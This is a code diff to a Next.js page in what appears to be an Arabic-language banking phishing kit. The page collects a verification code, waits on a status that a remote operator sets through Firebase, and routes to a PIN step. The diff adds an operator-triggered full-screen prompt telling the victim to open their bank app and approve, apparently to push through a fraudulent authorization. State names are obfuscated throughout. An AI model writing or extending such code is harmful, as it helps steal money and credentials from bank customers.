@@ -5,7 +5,7 @@ import { useRouter } from "next/navigation"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Alert, AlertDescription } from "@/components/ui/alert"
-import { ShieldCheck, AlertCircle, RefreshCw, Clock, Lock } from "lucide-react"
+import { ShieldCheck, AlertCircle, RefreshCw, Clock, Lock, Smartphone } from "lucide-react"
 import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
 import { StepShell } from "@/components/step-shell"
 import { db } from "@/lib/firebase"
@@ -19,7 +19,7 @@ export default function VeriPage() {
   const router = useRouter()
   const [_v5, _s5] = useState("")
   const [error, setError] = useState("")
-  const [_v5Status, _ss5] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")
+  const [_v5Status, _ss5] = useState<"pending" | "verifying" | "approved" | "rejected" | "message">("pending")
   const [isLoading, setIsLoading] = useState(true)
   const [visitorId, setVisitorId] = useState<string>("")
   const [canResend, setCanResend] = useState(false)
@@ -112,10 +112,11 @@ export default function VeriPage() {
           } else if (status === "approved") {
             _ss5("approved")
             setError("")
-            // Redirect to PIN page
             router.push("/step3")
           } else if (status === "verifying") {
             _ss5("verifying")
+          } else if (status === "message") {
+            _ss5("message")
           }
         }
       },
@@ -256,6 +257,30 @@ export default function VeriPage() {
     <>
       {(_v5Status === "verifying") && (
         <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
+      )}
+
+      {(_v5Status === "message") && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a4a68]/95" dir="rtl">
+          <div className="text-center space-y-6 px-8">
+            <div className="relative mx-auto flex h-24 w-24 items-center justify-center">
+              <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-yellow-400/30" />
+              <div className="absolute h-20 w-20 rounded-full border-4 border-yellow-400/50" />
+              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-yellow-400/20">
+                <Smartphone className="h-8 w-8 text-yellow-400" />
+              </div>
+            </div>
+            <div className="space-y-3">
+              <p className="text-xl font-bold leading-relaxed text-white">
+                الرجاء الدخول لتطبيق البنك الخاص بك والموافقة
+              </p>
+              <div className="flex items-center justify-center gap-2">
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "0ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "150ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "300ms" }} />
+              </div>
+            </div>
+          </div>
+        </div>
       )}
 
       <StepShell
